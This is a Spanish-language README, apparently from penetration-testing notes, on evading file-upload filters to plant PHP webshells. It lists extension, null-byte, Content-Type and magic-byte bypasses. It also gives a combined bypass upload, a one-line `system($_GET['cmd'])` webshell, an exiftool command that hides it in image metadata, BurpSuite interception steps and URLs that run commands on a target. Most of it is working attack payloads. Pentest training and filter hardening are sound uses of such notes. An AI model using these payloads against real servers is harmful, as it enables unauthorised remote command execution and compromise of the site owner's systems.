# File Upload — Evasión de Filtros

Técnicas para subir webshells PHP eludiendo los filtros de validación.

---

## Ficheros

| Fichero | Contenido |
|---|---|
| `EvasinFiltrosFileUpload.txt` | Guía completa — blacklist, whitelist, Content-Type, magic bytes, bypass combinado |

---

## Las 3 capas de filtros

| Filtro | Qué mira | Bypass |
|---|---|---|
| Blacklist extensión | `filename` | `.php5`, `.pHp`, `.phtml`, `.phar` |
| Whitelist extensión | `filename` | Null byte: `shell.php%00.png` *(PHP < 5.3.4)* |
| Content-Type | Header MIME | Cambiar a `image/png` en Burp |
| Magic bytes | Primeros bytes del fichero | Añadir `GIF89a;` antes del payload |

---

## Bypass combinado (máxima cobertura)

```
filename="shell.php%00.png"
Content-Type: image/png

GIF89a;<?php system($_GET['cmd']); ?>
```

| Filtro | Ve | Resultado |
|---|---|---|
| Extensión | `.png` | ✅ Permitido |
| MIME | `image/png` | ✅ Permitido |
| Magic bytes | `GIF89a` | ✅ Permitido |
| PHP al ejecutar | `<?php ...` | ✅ Ejecutado |

---

## Extensiones alternativas PHP

```
.php1  .php2  .php3  .php4  .php5  .php7
.pHp   .pHP   .PHp   .PHP
.phtml .phar  .phps
```

---

## Payload mínimo webshell

```php
<?php system($_GET['cmd']); ?>
```

Con magic bytes:
```
GIF89a;<?php system($_GET['cmd']); ?>
```

Via exiftool (metadatos EXIF):
```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' imagen.png
```

---

## Flujo en BurpSuite

1. Activa Intercept (`Proxy > Intercept > On`)
2. Sube el fichero desde la web
3. Burp captura el POST multipart
4. Localiza `Content-Disposition` y `Content-Type` del bloque del fichero
5. Modifica `filename`, `Content-Type` y/o el cuerpo según aplique
6. Forward → observa la respuesta

> Tip: manda al Repeater (`Ctrl+R`) para probar variantes sin repetir el proceso.

---

## Verificar ejecución

```
http://TARGET/ruta/shell.php?cmd=id
http://TARGET/ruta/shell.php?cmd=whoami
```

> Para escalar a RCE completo vía UDF ver `SQLi/Escalada-WebShell-RCE.txt`
